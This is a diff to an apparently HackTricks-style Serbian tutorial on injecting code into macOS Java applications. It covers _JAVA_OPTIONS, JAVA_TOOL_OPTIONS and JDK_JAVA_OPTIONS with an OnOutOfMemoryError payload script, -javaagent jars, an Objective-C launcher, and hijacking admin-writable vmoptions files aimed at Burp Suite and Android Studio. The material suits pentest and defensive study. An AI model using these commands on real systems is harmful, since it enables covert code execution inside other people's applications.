@@ -4,7 +4,7 @@
 
 ## Enumeracija
 
-Pronađite Java aplikacije instalirane na sistemu. Uočeno je da će Java aplikacije u datoteci **Info.plist** sadržati neke Java parametre koji sadrže string **`java.`**, pa ih možete pretražiti:
+Pronađite Java aplikacije instalirane na sistemu. Uočeno je da će Java aplikacije u datoteci **Info.plist** sadržati određene Java parametre koji sadrže string **`java.`**, pa možete pretražiti upravo taj string:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,13 +14,20 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-Promenljiva okruženja **`_JAVA_OPTIONS`** može da se koristi za ubacivanje proizvoljnih parametara Java VM-a prilikom pokretanja Java aplikacije.<sup>[[1]](#references)</sup>
+Promenljiva okruženja **`_JAVA_OPTIONS`** može se koristiti za ubacivanje proizvoljnih Java VM parametara prilikom pokretanja Java aplikacije.<sup>[[1]](#references)</sup>
+
+Java launch stack takođe prepoznaje dve bolje definisane promenljive sa različitim opsezima:
+
+- `JAVA_TOOL_OPTIONS` se čita kada se VM kreira, uključujući neke ugrađene putanje pokretanja koje ne prolaze kroz `java` launcher. Može da ubaci instrumentation opcije kao što su `-javaagent`, `-agentlib` ili `-agentpath`.<sup>[[4]](#references)</sup>
+- `JDK_JAVA_OPTIONS` `java` launcher dodaje na početak svoje komandne linije. Opcije koje biraju main class ili prekidaju launcher nisu dozvoljene, ali je `-javaagent` prihvaćen.<sup>[[5]](#references)</sup>
+
+Sve tri promenljive treba tretirati kao kontrole izvršavanja koda u JVM-u kada attacker može da obezbedi i kompatibilan agent koji može da se učita. `_JAVA_OPTIONS` je HotSpot implementacioni detalj, zato ga validirajte u odnosu na tačnog vendor-a i verziju; `JAVA_TOOL_OPTIONS` ili `JDK_JAVA_OPTIONS` su pogodnije za prenosivo testiranje.
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Da biste ga izvršili kao novi proces, a ne kao child trenutnog terminala, možete koristiti:
+Da biste ga izvršili kao novi process, a ne kao child trenutnog terminala, možete koristiti:
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -73,7 +80,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Međutim, ta tehnika izaziva grešku u izvršavanoj aplikaciji. Diskretnija alternativa je kreiranje Java agenta i korišćenje opcije `-javaagent`:<sup>[[2]](#references)</sup>
+Međutim, ta tehnika izaziva grešku u aplikaciji koja se izvršava. Diskretnija alternativa je kreiranje Java agent-a i korišćenje opcije `-javaagent`:<sup>[[2]](#references)</sup>
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -81,11 +88,17 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 # Or
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
+
+# The same agent with the standardized VM initialization variable:
+JAVA_TOOL_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
+
+# Or through the JDK java launcher:
+JDK_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
 ```
 > [!CAUTION]
-> Kreiranje agenta sa **drugom Java verzijom** od one koju koristi aplikacija može izazvati pad i agenta i aplikacije.
+> Kreiranje agenta sa **drugom Java verzijom** od one koju koristi aplikacija može srušiti i agent i aplikaciju.
 
-Gde agent može biti:
+Agent može biti:
 ```java:Agent.java
 import java.io.*;
 import java.lang.instrument.*;
@@ -114,7 +127,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-Zatim eksportujte env promenljivu i pokrenite java aplikaciju ovako:
+A zatim eksportujte env promenljivu i pokrenite java aplikaciju ovako:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -125,12 +138,12 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 ```
 ## vmoptions fajl
 
-Ovaj fajl podržava navođenje **Java parametara** prilikom izvršavanja Jave. Možete koristiti neke od prethodnih tehnika da promenite Java parametre i **naterate proces da izvrši proizvoljne komande**.\
-Štaviše, ovaj fajl može da **uključi druge fajlove** pomoću direktive `include`, tako da možete promeniti i uključeni fajl.
+Ovaj fajl podržava navođenje **Java parametara** prilikom izvršavanja Java-e. Možete koristiti neke od prethodnih tehnika da promenite Java parametre i **naterate proces da izvrši proizvoljne komande**.\
+Pored toga, ovaj fajl može da **uključi druge fajlove** pomoću direktive `include`, tako da možete promeniti i uključeni fajl.
 
-Pored toga, neke Java aplikacije će **učitati više od jednog `vmoptions`** fajla.
+Štaviše, neke Java aplikacije će **učitati više od jednog `vmoptions`** fajla.
 
-Neke aplikacije, kao što je Android Studio, navode u svom **izlazu gde traže** ove fajlove:<sup>[[3]](#references)</sup>
+Neke aplikacije, kao što je Android Studio, u svom **izlazu navode gde traže** ove fajlove:<sup>[[3]](#references)</sup>
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -141,7 +154,7 @@ Neke aplikacije, kao što je Android Studio, navode u svom **izlazu gde traže**
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-Ako to ne učine, možete proveriti da li postoji pomoću:
+Ako to ne urade, možete proveriti pomoću:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -149,11 +162,13 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Imajte na umu da Android Studio u ovom primeru pokušava da učita **`/Applications/Android Studio.app.vmoptions`**, lokaciju kojoj svaki korisnik u grupi **`admin` ima dozvolu za upis**.
+Imajte na umu da Android Studio u ovom primeru pokušava da učita **`/Applications/Android Studio.app.vmoptions`**, lokaciju kojoj bilo koji korisnik u **`admin` grupi ima dozvolu za upis**.
 
 ## References
 
 - [1] [OpenJDK — parsiranje `_JAVA_OPTIONS` u `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
 - [2] [Oracle Java — specifikacija paketa `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
 - [3] [JetBrains — Konfigurisanje JVM opcija i svojstava platforme](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
+- [4] [Oracle Java — `JAVA_TOOL_OPTIONS`](https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/envvars002.html)
+- [5] [Pokretač `java` — `JDK_JAVA_OPTIONS`](https://docs.oracle.com/en/java/javase/25/docs/specs/man/java.html#using-the-jdk_java_options-launcher-environment-variable)
 {{#include ../../../banners/hacktricks-training.md}}
